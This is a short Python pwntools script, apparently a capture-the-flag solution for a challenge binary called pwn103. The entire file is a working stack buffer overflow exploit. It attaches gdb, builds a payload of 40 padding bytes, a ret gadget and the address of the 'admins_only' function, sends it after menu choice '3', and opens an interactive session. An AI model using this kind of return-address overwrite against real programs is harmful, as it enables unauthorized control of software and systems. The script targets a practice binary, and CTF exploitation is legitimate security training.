import pwn
import time

elf = pwn.context.binary = pwn.ELF("./pwn103.pwn103")
io = elf.process()
pwn.gdb.attach(io)
time.sleep(2)

adminAddr = elf.symbols['admins_only']
offset = 40
retAddr = 0x401016
payload = b"".join(
    [
        #Fill Buffer in general
        b"A" * offset,
        #Overwrite ret in general to be adminAddr
        pwn.p64(retAddr),
        pwn.p64(adminAddr)
    ]
)
print(payload)
io.sendline(b"3")
io.sendline(payload)
io.interactive()
